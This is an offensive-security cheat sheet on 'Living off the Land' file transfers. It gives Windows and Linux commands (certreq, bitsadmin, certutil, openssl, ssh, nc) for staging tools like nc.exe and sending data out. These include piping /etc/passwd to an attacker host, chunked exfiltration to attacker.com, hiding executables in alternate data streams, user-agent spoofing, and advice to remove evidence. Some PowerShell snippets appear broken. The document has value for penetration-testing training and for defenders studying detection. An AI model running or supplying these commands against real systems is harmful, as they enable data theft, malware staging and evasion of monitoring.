# Living off the Land - File transfers

## Living off The Land File Transfers

Living off the Land (LOL) techniques use built-in system utilities to perform operations rather than introducing external tools. For file transfers, these techniques help avoid detection by using legitimate binaries that already exist on the target system.

### Understanding LOLBins

The term LOLBins (Living off the Land binaries) originated from a Twitter discussion about binaries that attackers can use beyond their intended purpose. Two main resources document these binaries:

* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

LOLBins can perform various functions including:

* File downloads and uploads
* Command execution
* File read and write operations
* Security bypass techniques

### Windows LOLBins for File Transfers

#### CertReq.exe

CertReq is a Windows certificate request tool that can be repurposed to upload files.

```cmd
# Upload a file to remote server
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

On the receiving end, a simple netcat listener will capture the uploaded content:

```bash
# Receive file on attacker machine
sudo nc -lvnp 8000
```

Example output:

```
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

#### Bitsadmin

The Background Intelligent Transfer Service (BITS) is designed for file transfers with bandwidth throttling.

```cmd
# Download file using bitsadmin
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also provides BITS capabilities:

```powershell
# Download using PowerShell BITS module
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil

Certutil is a Windows certificate management tool that can download files:

```cmd
# Download file using certutil
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

# Alternative download syntax
certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe
```

Note: Modern antivirus solutions often flag certutil download operations.

### Linux LOLBins for File Transfers

#### OpenSSL

OpenSSL is commonly used for cryptographic operations but can transfer files similarly to netcat.

**Server Side Setup**

```bash
# Create a certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start server to send a file
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**Client Side Download**

```bash
# Download the file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

#### Wget and Curl

While primarily download tools, they can be used for uploads in combination with web servers:

```bash
# Upload with curl to a server supporting POST uploads
curl -X POST -F "file=@/path/to/local/file" http://server.com/upload

# Upload via wget POST request
wget --post-file=/path/to/local/file http://server.com/upload
```

#### SSH/SCP/SFTP

These tools are designed for secure file transfers but can be considered LOLBins when used creatively:

```bash
# Exfiltrate data using SSH
cat /etc/passwd | ssh user@attacker "cat > passwd.txt"
```

### Advanced LOL Techniques

#### Alternate Data Streams (Windows)

```cmd
# Store file in alternate data stream
type nc.exe > "C:\Program Files\legit.txt:nc.exe"

# Execute from alternate data stream
wmic process call create '"C:\Windows\System32\cmd.exe" /c powershell -command "$(cat C:\Program Files\legit.txt:nc.exe)"'
```

#### Base64 Command Line Transfers

```powershell
# PowerShell encode and transfer via clipboard
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\path\to\file.exe"))
# (Copy output to clipboard)
```

```bash
# Linux decode from clipboard
echo "BASE64_STRING" | base64 -d > file.exe
```

### Detection Evasion Techniques

#### Modifying User-Agent Strings

```powershell
# PowerShell custom user agent
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$WebClient.DownloadFile("http://10.10.10.32:8000/nc.exe", "nc.exe")
```

#### Traffic Encryption

```bash
# OpenSSL encrypted transfer
# Sender:
cat file | openssl enc -aes-256-cbc -pass pass:password | nc 10.10.10.32 8000

# Receiver:
nc -lvnp 8000 | openssl enc -aes-256-cbc -d -pass pass:password > file
```

#### Transfer Chunking

```powershell
# Split file into chunks
$file = Get-Content -Raw "large_file.exe"
$chunks = [System.Collections.ArrayList]@()
$chunkSize = 1024
for ($i = 0; $i -lt $file.Length; $i += $chunkSize) {
    if ($i + $chunkSize -gt $file.Length) {
        $chunk = $file.Substring($i)
    } else {
        $chunk = $file.Substring($i, $chunkSize)
    }
    $chunks.Add($chunk) | Out-Null
}

# Transfer each chunk individually
foreach ($chunk in $chunks) {
    Invoke-WebRequest -Uri "http://attacker.com/exfil?data=$chunk" -Method GET
}
```

### Identifying Transfer Capabilities

When assessing which LOLBins to use for file transfers, check for available tools:

```bash
# Linux: Check for common tools
which curl wget python nc netcat openssl ssh scp 2>/dev/null

# Additional check for Python modules
python3 -c "help('modules')" | grep -E "(http|ftplib|requests)"
```

```powershell
# Windows: Check for common transfer tools
Where-Object { Test-Path $_ } -Value @(
    "$env:SystemRoot\System32\certutil.exe",
    "$env:SystemRoot\System32\bitsadmin.exe",
    "$env:SystemRoot\System32\certreq.exe"
)
```

### Best Practices

1. **Use native tools first** to avoid introducing new binaries
2. **Test transfers beforehand** in similar environments
3. **Consider size limitations** of different methods
4. **Be aware of logging mechanisms** that might detect LOLBin abuse
5. **Clean up after transfers** to remove evidence
6. **Use encrypted transfers** when possible
